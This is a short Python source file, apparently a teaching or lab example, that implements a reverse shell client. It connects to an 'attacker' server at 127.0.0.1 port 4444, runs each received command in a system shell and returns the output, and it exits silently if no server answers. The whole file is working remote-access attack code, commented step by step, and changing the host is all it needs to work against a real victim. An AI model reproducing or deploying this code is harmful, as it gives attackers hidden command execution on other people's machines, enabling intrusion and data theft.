import socket
import subprocess

def start_victim_client():
    
    # the IP and Port of the attacker's command center

    attacker_host = "127.0.0.1"
    attacker_port = 4444

    # create a TCP socker
    
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        
        # attempt to connect to the attacker's server
        
        client.connect((attacker_host, attacker_port))

        while True:
            
            # receive the command from the attacker
            
            command = client.recv(1024).decode()

            #if the attacker terminates the session

            if command.lower() == 'exit':
                break

            # execute the received command on the system shell
            # stderr=subprocess.STDOUT merges errors into the normal output stream
            # shell=True allows running standard system commands like 'dir' or 'whoami'

            proc = subprocess.Popen(command, shell= True,
                                    stdout=subprocess.PIPE, 
                                    stderr=subprocess.PIPE,
                                    stdin=subprocess.PIPE)
            
            # read the output of the command 
            stdout_value = proc.stdout.read() + proc.stderr.read()

            # if the command didn't return any text (e.g., creating a folder), send a confirmation
            if not stdout_value:
                stdout_value = b"[+] Command executed successfully (No output).\n"

            # send the result back to the attacker
            client.send(stdout_value)

    except ConnectionRefusedError:
        # silent exit if the server is not active
        pass

    finally:
        client.close()

if __name__ == "__main__":
    start_victim_client()
